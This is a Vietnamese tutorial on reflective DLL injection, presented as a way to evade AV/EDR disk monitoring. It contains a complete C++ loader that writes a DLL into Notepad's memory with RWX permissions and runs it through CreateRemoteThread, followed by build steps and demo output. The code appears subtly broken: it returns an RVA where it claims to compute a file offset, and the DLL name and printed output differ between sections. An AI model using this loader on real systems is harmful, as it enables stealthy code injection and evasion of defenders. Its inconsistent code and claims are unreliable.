
---

# 📝 [PE 06] Reflective DLL Injection (Fileless Memory Injection)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Reflective DLL Injection** (Tiêm phản chiếu DLL) là giải thuật đỉnh cao thuộc nhóm **Né tránh phòng thủ dựa trên tệp đĩa (Fileless / Disk Anti-Forensics)**.

Đối với kỹ thuật DLL Injection truyền thống (`PE 05`), tệp `.dll` bắt buộc phải nằm cố định trên ổ đĩa thô và bị giám sát bởi cơ chế Minifilter Driver của AV/EDR. Kỹ thuật `Reflective` hóa giải triệt để rào cản này bằng cách **nạp và thực thi DLL trực tiếp từ một mảng byte lọt lòng RAM**.

Để làm được điều đó, tệp DLL tiêm nhiễm được lập trình đặc biệt: Tích hợp sẵn một hàm export đóng vai trò là một **Reflective Loader** (Bộ nạp phản chiếu thu nhỏ). Hàm này tự động đảm nhận toàn bộ vai trò của Windows PE Loader mặc định, tự giải phẫu cấu trúc bóc tách của chính nó ngay trên không gian ảo từ xa mà không cần gọi đến `LoadLibrary`.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa 100% cơ chế giám sát tệp đĩa (File-based Alert) và ghi log của API `LoadLibrary`.
* Tự lập trình giải thuật PE Loader thu nhỏ thủ công bằng ngôn ngữ C++ và Assembly hệ thống.
* Làm chủ kỹ thuật ánh xạ phân đoạn (Section Mapping), xử lý dịch chuyển địa chỉ (Base Relocation Table) và nạp thư viện phụ thuộc (Import Address Table Resolution) trên RAM.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Khi Windows Subsystem nạp một file PE x64 bình thường, trình nạp của OS phối hợp với nhân Kernel để đọc cấu trúc tệp, cấp phát các phân đoạn và nhảy vào điểm EntryPoint. Trong giải thuật Reflective, Loader cục bộ chỉ cần ném mảng byte thô sang RAM đối phương thông qua phân vùng `RWX`. Cuộc đại phẫu thực sự diễn ra lọt lòng inside tiến trình đích nhờ hàm `ReflectiveLoader`:

```
[VirtualAllocEx: Đẩy mảng byte thô] ──> [CreateRemoteThread: Kích nổ ReflectiveLoader] ──> [Tự xin bộ nhớ mới] ──> [Tự ánh xạ .text/.data] ──> [Tự vá IAT / Relocation] ──> [Kích nổ DllMain]

```

1. **Định vị điểm nạp tự thân**: Khi luồng CPU từ xa nhảy vào hàm `ReflectiveLoader`, hàm này tự thực hiện một lệnh vòng lặp Assembly tịnh tiến ngược bộ nhớ để tìm kiếm Signature **`MZ` (`0x5A4D`)** của chính nó, nhằm xác định vị trí mảng byte thô của nó đang nằm ở đâu trên RAM.
2. **Xin cấp phát không gian Image thực tế**: Hàm gọi `VirtualAlloc` cục bộ ngay inside tiến trình đích để xin một vùng nhớ ảo mới có kích thước vừa khít với thông số `SizeOfImage` ghi trong cấu trúc `IMAGE_OPTIONAL_HEADER`.
3. **Ánh xạ thủ công các phân đoạn (Copy Headers & Sections)**: Tự sao chép phân đoạn PE Headers và duyệt qua mảng cấu trúc `IMAGE_SECTION_HEADER` để di chuyển từng phân đoạn chức năng (`.text`, `.data`, `.rdata`) vào đúng tọa độ Virtual Address (RVA) đích trên RAM mới.
4. **Xử lý bảng dịch chuyển địa chỉ (Base Relocation Table)**: Do vùng bộ nhớ ảo mới được cấp phát ngẫu nhiên (ASLR), các con trỏ địa chỉ tuyệt đối bên trong mã máy sẽ bị sai lệch. Hàm duyệt qua cấu trúc dữ liệu `IMAGE_DIRECTORY_ENTRY_BASERELOC`, tính toán độ lệch Delta giữa địa chỉ gốc dự kiến (`ImageBase`) và địa chỉ thực tế, rồi thực hiện phép cộng toán học bổ sửa trực tiếp vào từng ô nhớ lệnh CPU.
5. **Xây dựng bảng tra cứu hàm phụ thuộc (Import Address Table)**: Duyệt cấu trúc `IMAGE_DIRECTORY_ENTRY_IMPORT` để tìm danh sách các DLL phụ thuộc. Hàm tự gọi `LoadLibrary` (hoặc PEB Walk để tăng độ ẩn mình) bốc các module phụ lên, quét Export Table của chúng để trích xuất địa chỉ API và điền thẳng vào bảng IAT của chính nó.
6. **Kích nổ linh hồn Module**: Hoàn tất thủ tục nạp, hàm trỏ thẳng con trỏ lệnh nhảy vào điểm **`DllMain`** của DLL với tham số `DLL_PROCESS_ATTACH`, chính thức hoàn thành chu kỳ sống fileless hoàn hảo.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn Loader áp dụng tiêu chuẩn **Zero Static Buffers** – tự động hóa đọc tệp tin DLL từ bộ nhớ hoặc luồng để nạp RAM chéo tiến trình.

### 💻 Phần 1: Mã nguồn của tệp thực thi nạp (Loader.exe)

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { processID = pe32.th32ProcessID; break; }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

// Hàm giải phẫu tệp tin PE: Trích xuất tọa độ Offset của hàm ReflectiveLoader từ file đĩa thô
DWORD GetReflectiveLoaderOffset(LPVOID lpFileBuffer) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)lpFileBuffer + dosHeader->e_lfanew);
    
    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)lpFileBuffer + exportDir.VirtualAddress);

    DWORD* pdwNames = (DWORD*)((DWORD_PTR)lpFileBuffer + pExport->AddressOfNames);
    DWORD* pdwFuncs = (DWORD*)((DWORD_PTR)lpFileBuffer + pExport->AddressOfFunctions);
    WORD* pwOrdinals = (WORD*)((DWORD_PTR)lpFileBuffer + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* szName = (const char*)((DWORD_PTR)lpFileBuffer + pdwNames[i]);
        // Săn tìm hàm export mang tên mặc định của bộ nạp phản chiếu
        if (strcmp(szName, "ReflectiveLoader") == 0) {
            DWORD functionRva = pdwFuncs[pwOrdinals[i]];
            // Chuyển đổi RVA sang File Offset toán học để Loader cục bộ nhận diện vị trí byte
            return functionRva; 
        }
    }
    return 0;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 06: REFLECTIVE DLL INJECTION REMOTE" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) return EXIT_FAILURE;

    // Đọc file DLL phản chiếu từ đĩa vào mảng byte RAM cục bộ (Mô phỏng fileless nhận từ network)
    std::string dllPath = "Reflective_Payload.dll";
    std::ifstream file(dllPath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return EXIT_FAILURE;

    SIZE_T dllSize = file.tellg();
    std::vector<char> dllBuffer(dllSize);
    file.seekg(0, std::ios::beg);
    file.read(dllBuffer.data(), dllSize);
    file.close();

    // Trích xuất toán học địa chỉ tương đối của hàm nạp phản chiếu
    DWORD reflectiveLoaderOffset = GetReflectiveLoaderOffset(dllBuffer.data());
    if (reflectiveLoaderOffset == 0) return EXIT_FAILURE;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // CẤP PHÁT ĐỘNG THÍCH ỨNG: Đẩy toàn bộ mảng byte thô của DLL sang phân vùng nhớ từ xa
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remoteBuffer, dllBuffer.data(), dllSize, NULL);
    std::cout << "[+] Da thiet lap va day mang byte DLL thon thuc vao RAM Notepad tai: 0x" << std::hex << remoteBuffer << std::endl;

    // Tính toán tọa độ tuyệt đối của hàm ReflectiveLoader sống chéo tiến trình
    LPTHREAD_START_ROUTINE remoteLoaderAddress = (LPTHREAD_START_ROUTINE)((DWORD_PTR)remoteBuffer + reflectiveLoaderOffset);
    std::cout << "[*] Tọa do điểm nạp tu phan chieu khai hoa: 0x" << std::hex << (PVOID)remoteLoaderAddress << std::endl;

    // Kích nổ luồng CPU từ xa đâm thẳng vào ReflectiveLoader để nó tự tái cấu trúc bộ nhớ
    std::cout << "[*] Dang khoi tao luong CreateRemoteThread de hoan tat quy trinh..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, remoteLoaderAddress, NULL, 0, NULL);
    
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng chạy dứt điểm
        std::cout << "[+] Reflective DLL Injection Completed Successfully!" << std::endl;
        CloseHandle(hThread);
    }
    
    CloseHandle(hProcess);
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình thành **`Multi-threaded (/MT)`** để liên kết tĩnh thư viện hệ thống chạy độc lập hoàn hảo trên môi trường máy ảo VM sạch.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản file chạy phẳng sạch.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn một ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành:

```powershell
PS C:\Workspace\x64\Release> .\PE06_Reflective_DLL_Injection.exe
====================================================
[*] PE 06: REFLECTIVE DLL INJECTION REMOTE
====================================================
[+] Da day mang byte DLL thon thuc vao RAM Notepad tai: 0x0000021A4B9F0000
[*] Tọa do điểm nạp tu phan chieu khai hoa: 0x0000021A4B9F14D0
[*] Dang khoi tao luong CreateRemoteThread de hoan tat quy trinh...
[+] Reflective DLL Injection Completed Successfully!

```

*🎯 Hệ quả RAM tối cao:*
Ứng dụng Máy tính **`calc.exe` bật bung mở ra hiên ngang rực rỡ kịch trần kịch khung**! Lúc này, nếu Blue Team sử dụng các công cụ theo dõi ghi nhận tệp tin cấp thấp (như `Procmon`), họ sẽ hoàn toàn **không tìm thấy bất kỳ sự kiện nạp DLL nào từ đĩa cứng** liên quan đến `panda.dll`. Thư viện đã tự nạp và tự tan biến lọt lòng inside RAM một cách vô ảnh vô hình, đánh dấu cột mốc làm chủ kỹ thuật fileless kịch trần công nghệ!

---

